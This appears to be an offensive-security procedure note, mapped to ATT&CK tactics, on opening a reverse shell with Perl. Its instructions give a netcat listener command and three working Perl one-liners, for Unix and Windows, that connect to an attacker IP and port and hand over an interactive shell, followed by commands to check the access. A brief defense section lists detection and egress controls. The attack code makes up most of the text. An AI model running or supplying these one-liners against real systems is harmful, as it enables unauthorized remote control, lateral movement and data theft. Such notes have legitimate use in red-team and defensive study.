---
id: d56a8da3-7c34-47ed-833e-3c3a620d1b03
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.227846+00:00'
updated_at: '2023-04-10T20:25:29.837885+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Custom Command and Control Protocol|T1094 - Custom Command and
    Control Protocol]]
sub_techniques: []
tags:
  - '[[tags/Perl]]'
  - '[[tags/Reverse Shell]]'
commands: []
platforms:
  - Linux
  - Unix
  - Windows
tools: []
validated: true
---

# Establish-Reverse-Shell-Using-Perl

## Summary

This procedure demonstrates how to establish a reverse shell connection from a target machine to an attacker-controlled system using Perl one-liner scripts. It leverages Perl's socket capabilities to create a TCP connection back to the attacker, allowing remote command execution while bypassing outbound firewall restrictions that block incoming connections.

## Description

A Perl reverse shell enables attackers to gain interactive shell access to a compromised target by having the target initiate a connection to the attacker's listening port. This is particularly useful in environments where direct inbound access is restricted, such as behind NAT or firewalls. The technique uses Perl's built-in Socket and IO modules to handle the network communication and pipe it to a shell process (/bin/sh on Unix-like systems). Three variants are provided: a basic socket-based one-liner for Unix, a forked version for better stability on Unix, and a non-forked version for Windows. This procedure assumes Perl is available on the target and focuses on the execution phase after initial access has been gained, such as via a web shell or command injection.

## Requirements

1. Perl interpreter installed on the target system (version 5.x or later).
2. Network connectivity from the target to the attacker's IP and port (outbound TCP allowed).
3. Attacker machine with a listening service (e.g., netcat) on the specified port.
4. Initial code execution capability on the target (e.g., via RCE vulnerability).

## Defense

- Implement application whitelisting to restrict Perl execution to approved scripts only.
- Monitor for anomalous outbound TCP connections to non-standard ports from internal systems.
- Enable endpoint detection and response (EDR) tools to flag Perl processes creating sockets or forking unexpectedly.
- Use network segmentation and egress filtering to block unauthorized outbound connections.
- Log and alert on Perl command-line executions, especially one-liners with socket modules.

## Objectives

1. Establish a bidirectional TCP connection from target to attacker.
2. Spawn an interactive shell on the target for remote command execution.
3. Maintain persistence for post-exploitation activities like lateral movement or data exfiltration.

## Instructions

### Step 1: Prepare the Listener on Attacker Machine

**Context**: Set up a TCP listener to receive the incoming connection from the target. This step ensures the attacker is ready to interact with the shell once connected.

Use a tool like netcat to listen on the specified port (e.g., 4242). Run the following on the attacker machine:

```bash
nc -lvnp 4242
```

> This command binds to port 4242 and waits for connections. Expected output: "Listening on 0.0.0.0 4242" followed by connection details upon success.

### Step 2: Execute Perl Reverse Shell on Target

**Context**: Deliver and run one of the Perl one-liners on the target to initiate the reverse connection. Choose the variant based on the target's OS. Replace placeholders with actual attacker IP and port.

Reference the code snippet: [[codes/Perl-Reverse-Shell-One-Liners]]

For Unix-like systems (basic socket version):

```perl
perl -e 'use Socket;$i="$_ATTACKER_IP";$p=$_ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

For Unix-like systems (IO module with fork for stability):

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$_ATTACKER_IP:$_ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

For Windows systems:

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$_ATTACKER_IP:$_ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

> Execution will connect back to the listener. If successful, the attacker sees a shell prompt on their netcat session. Verify by running commands like 'whoami' or 'id' to confirm shell access. If the connection fails, check firewall rules, Perl availability, or IP/port values.

### Step 3: Interact and Verify Shell Access

**Context**: Once connected, test the shell to ensure full interactivity and stability.

In the netcat listener session, execute basic commands to validate access:

```bash
whoami
id
pwd
```

> Expected output: User context, UID/GID details, and current directory on the target. Success confirms the reverse shell is operational for further actions.
